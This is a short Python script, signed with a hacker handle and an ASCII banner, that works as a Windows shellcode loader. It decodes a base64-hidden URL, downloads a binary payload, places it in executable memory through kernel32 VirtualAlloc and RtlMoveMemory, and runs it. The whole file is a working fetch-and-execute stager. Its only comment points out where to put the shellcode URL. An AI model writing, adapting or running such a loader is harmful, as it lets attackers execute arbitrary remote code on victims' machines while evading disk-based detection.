import urllib.request
import ctypes
import base64
#By SYSR@M
print("""
  ____           _______     _______ _____         __  __ 
 |  _ \         / ____\ \   / / ____|  __ \  ____ |  \/  |
 | |_) |_   _  | (___  \ \_/ / (___ | |__) |/ __ \| \  / |
 |  _ <| | | |  \___ \  \   / \___ \|  _  // / _` | |\/| |
 | |_) | |_| |  ____) |  | |  ____) | | \ \ | (_| | |  | |
 |____/ \__, | |_____/   |_| |_____/|_|  \_\ \__,_|_|  |_|
         __/ |                              \____/        
        |___/                                             """)
k32 = ctypes.windll.kernel32
jbcode = urllib.request.urlopen(base64.b64decode("aHR0cDovLzEyNy4wLjAuMTo3NzQxL3B0LmJpbg==").decode("ASCII")).read() 
#URL base64前就是Shellcode的URL
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.RtlMoveMemory.argtypes = (ctypes.c_void_p,ctypes.c_void_p,ctypes.c_size_t)
code_buf=k32.VirtualAlloc(None, len(jbcode), 0x3000, 0x40)
k32.RtlMoveMemory(code_buf, jbcode, len(jbcode))
CODEFUNC = ctypes.CFUNCTYPE(ctypes.c_void_p)
NMSL = CODEFUNC(code_buf)
NMSL()